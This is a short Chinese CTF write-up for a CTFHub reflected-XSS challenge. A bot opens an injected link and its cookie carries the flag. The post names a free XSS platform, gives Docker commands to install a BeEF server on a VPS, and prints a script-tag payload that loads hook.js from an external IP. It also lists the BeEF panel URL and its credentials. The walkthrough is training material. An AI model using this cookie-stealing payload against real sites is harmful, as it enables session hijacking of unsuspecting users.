---
title: xss reflect
date: 2020-05-30 10:46:38
tags: CTF
---


## 题目
from https://www.ctfhub.com/
name存在xss漏洞，将注入xss的url发送给bot,服务器会打开这个链接，从而获取到服务器的cookie并拿到flag
![](/images/xss/web.png)

## 方法1:使用免费xss平台
https://xsshs.cn/

![](/images/xss/xsshs.png)
![](/images/xss/xsshs-flag.png)


## 方法2：购买VPS搭建beef平台

### 安装beef
``` bash
# install docker 
sudo apt-get update

sudo apt-get install -y \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo apt-key fingerprint 0EBFCD88

sudo add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable"

sudo apt-get install -y docker-ce docker-ce-cli containerd.io

# install beef

# https://github.com/phocean/dockerfile-beef

docker run --rm -it --net=host -v $HOME/.msf4:/root/.msf4:Z -v /tmp/msf:/tmp/data:Z --name=beef phocean/beef
```

### 利用xss注入beef hook
``` js
<script src="http://45.63.54.77:3000/hook.js" type="text/javascript" ></script>
```
![](/images/xss/beef.png)

### 登录beef(beef:Pass123) 获得cookie和flag
http://45.63.54.77:3000/ui/authentication 
![](/images/xss/beef-flag.png)

